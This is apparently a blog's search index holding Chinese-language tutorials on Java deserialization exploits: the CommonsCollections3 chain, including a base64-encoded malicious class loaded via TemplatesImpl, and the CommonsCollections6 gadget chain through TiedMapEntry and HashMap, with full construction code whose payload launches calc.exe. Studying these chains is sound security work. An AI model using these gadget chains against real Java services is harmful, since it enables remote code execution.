<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CommonsCollections3</title>
    <link href="/2023/05/10/CommonsCollections3/"/>
    <url>/2023/05/10/CommonsCollections3/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><p>随着Java反序列化工具ysoserial的火爆，开发者也在寻找防御的方式。通过黑名单与白名单的方式来限制反序列化时允许通过的类就是常见的方式。</p><p>CommonsCollections3在InvokerTransformer被过滤的情况下诞生，用于绕过一些规则对InvokerTransformer的限制。</p><p><strong>ysoserial的cc3介绍</strong></p><blockquote><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">* Variation <span class="hljs-keyword">on</span> CommonsCollections1 <span class="hljs-keyword">that</span> uses InstantiateTransformer <span class="hljs-keyword">instead of</span><br>* InvokerTransformer.<br></code></pre></td></tr></table></figure></blockquote><h3 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h3><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类中定义了一个内部类<code>TransletClassLoader</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransletClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>    TransletClassLoader(ClassLoader parent) &#123;<br>        <span class="hljs-built_in">super</span>(parent);<br>    &#125;<br><br>    Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.defineClass((String)<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个类重写了<code>defineClass</code>方法，并且这里没有显式地声明其定义域。默认情况下，在Java中，如果一个方法没有显式声明作用域，其作用域为default。</p><p>所以也就是说这里的<code>defineClass</code>由其父类的protected类型变成了一个default类型的方法，可以被类外部调用。</p><p>哪里可以调用<code>TransletClassLoader.defineClass()</code>呢？</p><p>我们从<code>TransletClassLoader.defineClass()</code>向前追溯一下调用链：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt;<br>TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span><br>-&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p><code>TemplatesImpl#getOutputProperties()</code>和<code>TemplatesImpl#newTransformer()</code>都是public的，可以被外部调用。我们尝试使用newTransformer()构造一个简单的POC：</p><p><strong>创建恶意类：</strong></p><p>恶意类需要继承自<code>AbstractTranslet</code>，这里在构造函数中打开一个计算器，将其编译为字节码，放到<code>TemplatesImpl</code>中执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Shell</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>newTransformer()简单POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] shell = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQATTG9yZy9leGFtcGxlL1NoZWxsOwEADVN0YWNrTWFwVGFibGUHACsHACkBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAClNoZWxsLmphdmEMAAkACgcALgwALwAwAQAIY2FsYy5leGUMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEAEW9yZy9leGFtcGxlL1NoZWxsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMAAQAJAAoAAQALAAAAfAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAwAMAAAAGgAGAAAADAAEAA4ADQARABAADwARABAAFQASAA0AAAAWAAIAEQAEAA4ADwABAAAAFgAQABEAAAASAAAAEAAC/wAQAAEHABMAAQcAFAQAAQAVABYAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABYADQAAACAAAwAAAAEAEAARAAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB0AAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAABoADQAAACoABAAAAAEAEAARAAAAAAABABcAGAABAAAAAQAeAB8AAgAAAAEAIAAhAAMAGwAAAAQAAQAcAAEAIgAAAAIAIw==&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(tmp, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;shell&#125;);<br>        setFieldValue(tmp, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Shell&quot;</span>);<br>        setFieldValue(tmp, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        tmp.newTransformer();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>setFieldValue()</code>用于设置私有属性，<code>_bytecodes</code>是由字节码组成的数组；<code>_name</code>是任意字符串，要求不能为null；<code>_tfactory</code>需要时一个<code>TransformerFactoryImpl</code>对象，因为<code>TemplatesImpl#defineTransletClasses()</code> 方法里有调用到 <code>_tfactory.getExternalExtensionsMap()</code> ，如果为null会出错</p><p><img src="https://img.katck.com/images/2023/05/10/77b762af49a04568dc7b3b4fbd1c9f80.png" alt="image-20230510143057787"></p><h3 id="CommonsCollection3"><a href="#CommonsCollection3" class="headerlink" title="CommonsCollection3"></a>CommonsCollection3</h3><p>CommonsCollection3中利用了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p><p>这个类的构造方法中调用了<code>(TransformerImpl) templates.newTransformer()</code>，让我们可以利用TemplatesImpl利用链</p><p><img src="https://img.katck.com/images/2023/05/10/978369abed3f5885f12ff8b5507e1e28.png" alt="image-20230510145330515"></p><p>如何在没有InvokerTransformer的情况下调用TrAXFilter的构造方法呢？</p><p>ysoserial使用了一个新的Transformer：<code>org.apache.commons.collections.functors.InstantiateTransformer</code>，InstantiateTransformer是实现了Transformer接口的类，他的作用就是调用构造方法。</p><p>所以利用思路就清晰了：利用<code>InstantiateTransformer</code>调用<code>TrAXFilter</code>的构造方法，再利用构造方法中的<code>templates.newTransformer()</code>调用<code>TemplatesImpl</code>中的字节码。</p><p><strong>Transformer调用链：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; tmp &#125;<br>    )<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://img.katck.com/images/2023/05/10/95de61aa31d5565e1de0f3c452cb3c35.png" alt="image-20230510151538721"></p>]]></content>
    
    
    <categories>
      
      <category>Java Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson</title>
    <link href="/2023/05/09/Fastjson/"/>
    <url>/2023/05/09/Fastjson/</url>
    
    <content type="html"><![CDATA[<p><img src="C:\Users\aurey\Documents\Blog\source\_posts\images\Fastjson\image-20230509222117208.png" alt="image-20230509222117208"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections6</title>
    <link href="/2023/05/07/CommonsCollections6/"/>
    <url>/2023/05/07/CommonsCollections6/</url>
    
    <content type="html"><![CDATA[<p>在ysoserial中，CommonsCollections6是比较通用的，在高版本Java中也可以利用。</p><h1 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h1><p><strong>ysoserial Gadget</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Gadget chain:</span><br><span class="hljs-comment">    java.io.ObjectInputStream.readObject()</span><br><span class="hljs-comment">            java.util.HashSet.readObject()</span><br><span class="hljs-comment">                java.util.HashMap.put()</span><br><span class="hljs-comment">                java.util.HashMap.hash()</span><br><span class="hljs-comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="hljs-comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="hljs-comment">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="hljs-comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="hljs-comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="hljs-comment">                            java.lang.reflect.Method.invoke()</span><br><span class="hljs-comment">                                java.lang.Runtime.exec()</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    by @matthias_kaiser</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>在Java 8u71以后，<code>sun.reflect.annotation.AnnotationInvocationHandler.readObject()</code>的逻辑变化了，所以不能用于触发LazyMap利用链。</p><p>cc6就是另辟蹊径，找到了其他调用<code>LazyMap.get()</code>的方法，以此来调用LazyMap利用链</p><p>ysoserial找到了<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>，它的方法有这样的调用关系<code>hashCode() =&gt; getValue() =&gt; this.map.get()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntry</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>.Entry, KeyValue, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">8453869361373831205L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object key;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> &#123;<br>        <span class="hljs-built_in">this</span>.map = map;<br>        <span class="hljs-built_in">this</span>.key = key;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.map.get(<span class="hljs-built_in">this</span>.key);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getValue();<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">this</span>.getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : <span class="hljs-built_in">this</span>.getKey().hashCode()) ^ (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在问题就转换成哪里可以调用到<code>TiedMapEntry.hashCode</code>了</p><h4 id="p神的简化Gadget"><a href="#p神的简化Gadget" class="headerlink" title="p神的简化Gadget"></a>p神的简化Gadget</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> Gadget chain:</span><br><span class="hljs-comment">     java.io.ObjectInputStream.readObject()</span><br><span class="hljs-comment">     java.util.HashMap.readObject()</span><br><span class="hljs-comment">     java.util.HashMap.hash()</span><br><span class="hljs-comment">    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="hljs-comment">    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="hljs-comment">     org.apache.commons.collections.map.LazyMap.get()</span><br><span class="hljs-comment">                    org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="hljs-comment">                    org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="hljs-comment">                    java.lang.reflect.Method.invoke()</span><br><span class="hljs-comment">                       java.lang.Runtime.exec()</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>主要的区别就是ysoserial中，利用<code>java.util.HashSet.readOject =&gt; HashMap.put() =&gt; HashMap.hash(key) =&gt; TiedMapEntry.hashCode()</code></p><p>p神发现了<code>java.util.HashMap.readObject() =&gt; HashMap.hash() =&gt; TiedMapEntry.hashCode()</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashMap</span>&lt;K,V&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMap</span>&lt;K,V&gt;<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable &#123;<br>    <br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<br>    <br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        ......<br><br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>在HashMap的readObject方法中，调用了<code>hash(key)</code>，而hash方法中，调用了<code>key.hashCode()</code></p><p>我们只需要让这个key等于TiedMapentry对象，即可构成一个完整的Gadget</p><h3 id="构造Gadget"><a href="#构造Gadget" class="headerlink" title="构造Gadget"></a>构造Gadget</h3><p>首先把恶意的LazyMap构造出来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br></code></pre></td></tr></table></figure><p>将恶意的LazyMap对象作为TiedMapEntry的Map属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;key&quot;</span>);<br></code></pre></td></tr></table></figure><p>为了调用<code>TiedMapEntry.hashCode()</code>，我们需要将<code>tme</code>对象作为<code>HashMap</code>的一个key</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>expMap.put(tme, <span class="hljs-string">&quot;value&quot;</span>);<br></code></pre></td></tr></table></figure><p>最后，将<code>expMap</code>作为对象来序列化</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// 生成序列化字符串</span><br>ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;<br>ObjectOutputStream oss = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">barr</span>)</span>;<br>oss.write<span class="hljs-constructor">Object(<span class="hljs-params">expMap</span>)</span>;<br>oss.close<span class="hljs-literal">()</span>;<br><br><span class="hljs-comment">// 反序列</span><br>ByteArrayInputStream bari = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayInputStream(<span class="hljs-params">barr</span>.<span class="hljs-params">toByteArray</span>()</span>);<br>ObjectInputStream ois = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectInputStream(<span class="hljs-params">bari</span>)</span>;<br>ois.read<span class="hljs-constructor">Object()</span>;<br>ois.close<span class="hljs-literal">()</span>;<br></code></pre></td></tr></table></figure><p>执行成功</p><p><img 